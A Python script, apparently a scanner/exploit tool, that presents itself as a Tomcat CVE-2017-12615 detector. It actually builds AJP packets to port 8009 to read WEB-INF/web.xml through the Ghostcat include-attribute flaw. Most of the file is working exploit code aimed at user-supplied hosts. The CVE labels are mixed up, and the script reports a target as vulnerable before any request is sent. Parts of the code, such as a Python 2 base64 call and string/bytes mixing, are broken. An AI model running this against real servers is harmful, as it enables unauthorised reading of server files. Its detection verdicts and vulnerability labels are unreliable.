'''
    Tomcat_CVE_2017_12615检测脚本。直接输入目标即可，自动探测8009端口。
                                                                    --by jammny.
    用法：
        python3 Tomcat_CVE_2017_12615.py 192.168.30.131:8080
'''

import threading
import sys
from socket import *
import os
import struct
from io import StringIO
from colorama import init, Fore

def pack_string(s):
    if s is None:
        return struct.pack(">h", -1)
    l = len(s)
    return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)

def unpack(stream, fmt):
    size = struct.calcsize(fmt)
    buf = stream.read(size)
    return struct.unpack(fmt, buf)

def unpack_string(stream):
    size, = unpack(stream, ">h")
    if size == -1:  # null string
        return None
    res, = unpack(stream, "%ds" % size)
    stream.read(1)  # \0
    return res

class NotFoundException(Exception):
    pass

class AjpBodyRequest(object):
    # server == web server, container == servlet
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    MAX_REQUEST_LENGTH = 8186

    def __init__(self, data_stream, data_len, data_direction=None):
        self.data_stream = data_stream
        self.data_len = data_len
        self.data_direction = data_direction

    def serialize(self):
        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
        if len(data) == 0:
            return struct.pack(">bbH", 0x12, 0x34, 0x00)
        else:
            res = struct.pack(">H", len(data))
            res += data
        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
            header = struct.pack(">bbH", 0x12, 0x34, len(res))
        else:
            header = struct.pack(">bbH", 0x41, 0x42, len(res))
        return header + res

    def send_and_receive(self, socket, stream):
        while True:
            data = self.serialize()
            socket.send(data)
            r = AjpResponse.receive(stream)
            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
                r = AjpResponse.receive(stream)

            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
                break

class AjpForwardRequest(object):
    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(
        28)
    REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE,
                       'TRACE': TRACE}
    # server == web server, container == servlet
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    COMMON_HEADERS = ["SC_REQ_ACCEPT",
                      "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE",
                      "SC_REQ_AUTHORIZATION",
                      "SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE",
                      "SC_REQ_COOKIE2",
                      "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
                      ]
    ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert",
                  "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]

    def __init__(self, data_direction=None):
        self.prefix_code = 0x02
        self.method = None
        self.protocol = None
        self.req_uri = None
        self.remote_addr = None
        self.remote_host = None
        self.server_name = None
        self.server_port = None
        self.is_ssl = None
        self.num_headers = None
        self.request_headers = None
        self.attributes = None
        self.data_direction = data_direction

    def pack_headers(self):
        self.num_headers = len(self.request_headers)
        res = ""
        res = struct.pack(">h", self.num_headers)
        for h_name in self.request_headers:
            if h_name.startswith("SC_REQ"):
                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
                res += struct.pack("BB", 0xA0, code)
            else:
                res += pack_string(h_name)

            res += pack_string(self.request_headers[h_name])
        return res

    def pack_attributes(self):
        res = b""
        for attr in self.attributes:
            a_name = attr['name']
            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
            res += struct.pack("b", code)
            if a_name == "req_attribute":
                aa_name, a_value = attr['value']
                res += pack_string(aa_name)
                res += pack_string(a_value)
            else:
                res += pack_string(attr['value'])
        res += struct.pack("B", 0xFF)
        return res

    def serialize(self):
        res = ""
        res = struct.pack("bb", self.prefix_code, self.method)
        res += pack_string(self.protocol)
        res += pack_string(self.req_uri)
        res += pack_string(self.remote_addr)
        res += pack_string(self.remote_host)
        res += pack_string(self.server_name)
        res += struct.pack(">h", self.server_port)
        res += struct.pack("?", self.is_ssl)
        res += self.pack_headers()
        res += self.pack_attributes()
        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
            header = struct.pack(">bbh", 0x12, 0x34, len(res))
        else:
            header = struct.pack(">bbh", 0x41, 0x42, len(res))
        return header + res

    def parse(self, raw_packet):
        stream = StringIO(raw_packet)
        self.magic1, self.magic2, data_len = unpack(stream, "bbH")
        self.prefix_code, self.method = unpack(stream, "bb")
        self.protocol = unpack_string(stream)
        self.req_uri = unpack_string(stream)
        self.remote_addr = unpack_string(stream)
        self.remote_host = unpack_string(stream)
        self.server_name = unpack_string(stream)
        self.server_port = unpack(stream, ">h")
        self.is_ssl = unpack(stream, "?")
        self.num_headers, = unpack(stream, ">H")
        self.request_headers = {}
        for i in range(self.num_headers):
            code, = unpack(stream, ">H")
            if code > 0xA000:
                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
            else:
                h_name = unpack(stream, "%ds" % code)
                stream.read(1)  # \0
            h_value = unpack_string(stream)
            self.request_headers[h_name] = h_value

    def send_and_receive(self, socket, stream, save_cookies=False):
        res = []
        i = socket.sendall(self.serialize())
        if self.method == AjpForwardRequest.POST:
            return res

        r = AjpResponse.receive(stream)
        assert r.prefix_code == AjpResponse.SEND_HEADERS
        res.append(r)
        if save_cookies and 'Set-Cookie' in r.response_headers:
            self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']

        # read body chunks and end response packets
        while True:
            r = AjpResponse.receive(stream)
            res.append(r)
            if r.prefix_code == AjpResponse.END_RESPONSE:
                break
            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
                continue
            else:
                raise NotImplementedError
                break
        return res

class AjpResponse(object):
    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
    COMMON_SEND_HEADERS = [
        "Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
        "Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
    ]

    def parse(self, stream):
        # read headers
        self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")

        if self.prefix_code == AjpResponse.SEND_HEADERS:
            self.parse_send_headers(stream)
        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
            self.parse_send_body_chunk(stream)
        elif self.prefix_code == AjpResponse.END_RESPONSE:
            self.parse_end_response(stream)
        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
            self.parse_get_body_chunk(stream)
        else:
            raise NotImplementedError

    def parse_send_headers(self, stream):
        self.http_status_code, = unpack(stream, ">H")
        self.http_status_msg = unpack_string(stream)
        self.num_headers, = unpack(stream, ">H")
        self.response_headers = {}
        for i in range(self.num_headers):
            code, = unpack(stream, ">H")
            if code <= 0xA000:  # custom header
                h_name, = unpack(stream, "%ds" % code)
                stream.read(1)  # \0
                h_value = unpack_string(stream)
            else:
                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]
                h_value = unpack_string(stream)
            self.response_headers[h_name] = h_value

    def parse_send_body_chunk(self, stream):
        self.data_length, = unpack(stream, ">H")
        self.data = stream.read(self.data_length + 1)

    def parse_end_response(self, stream):
        self.reuse, = unpack(stream, "b")

    def parse_get_body_chunk(self, stream):
        rlen, = unpack(stream, ">H")
        return rlen

    @staticmethod
    def receive(stream):
        r = AjpResponse()
        r.parse(stream)
        return r

def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False
    fr.attributes = []
    return fr

class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.socket = socket(AF_INET, SOCK_STREAM)
        self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb", buffering=0)

    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))
        print(Fore.RED + "[+] 存在Tomcat_CNVD_2020_10487漏洞！")
        # print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
        if user is not None and password is not None:
            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
        for h in headers:
            self.forward_request.request_headers[h] = headers[h]
        for a in attributes:
            self.forward_request.attributes.append(a)
        responses = self.forward_request.send_and_receive(self.socket, self.stream)
        if len(responses) == 0:
            return None, None
        snd_hdrs_res = responses[0]
        data_res = responses[1:-1]
        if len(data_res) == 0:
            print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
        return snd_hdrs_res, data_res

# 每个线程的运作 参数为文件名称的列表
def verify(url):
    try:
        t = Tomcat(url, 8009)
        _, data = t.perform_request('/asdf', attributes=[
            {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', 'WEB-INF/web.xml']},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
        ])
        #print('----------------------------')
        lock.acquire()
        lock.release()
        '''
        for d in data:
            data = d.data
            print(data.decode('utf-8'))
        print('----------------------------')
        '''
    except Exception as e:
        print(e)
    semaphore.release()

class scanner():
    def __init__(self, host):
        self.urls = host
        #self.urls = self.get_url()
        self.threading_scanner()

    def get_url(self):
        urls = list()
        if not os.path.exists("url.txt"):
            print("please drop the url in url.txt in same dircory with this script")
            sys.exit(0)
        with open("url.txt", "r") as fo:
            for line in fo:
                urls.append(line.rstrip("\r\n").rstrip('\n'))
        return urls

    def scan(self, url):
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(5)
            s.connect((url, 8009))
            print(Fore.RED + "[+] 开启8009端口！")
            verify(url)
            s.close()
        except Exception as e:
            print(Fore.GREEN + "[-] 可能不存在Tomcat幽灵猫漏洞（CVE_2017_12615）！未开启8009端口！")
        semaphore.release()

    def threading_scanner(self):
        threads = list()
        for url in self.urls:
            t = threading.Thread(target=self.scan, args=(url,))
            threads.append(t)
            semaphore.acquire()
            t.start()
        for t in threads:
            t.join()

semaphore = threading.Semaphore(5)
lock = threading.Lock()
def run(host):
    # targets = '192.168.30.131:8080'.split(':')
    targets = host.split(':')
    host = []
    host.append(targets[0])
    scanner(host)

if __name__ == '__main__':
    host = sys.argv[1]
    semaphore = threading.Semaphore(5)
    lock = threading.Lock()
    # targets = '192.168.30.131:8080'.split(':')
    targets = host.split(':')
    host = []
    host.append(targets[0])
    scanner(host)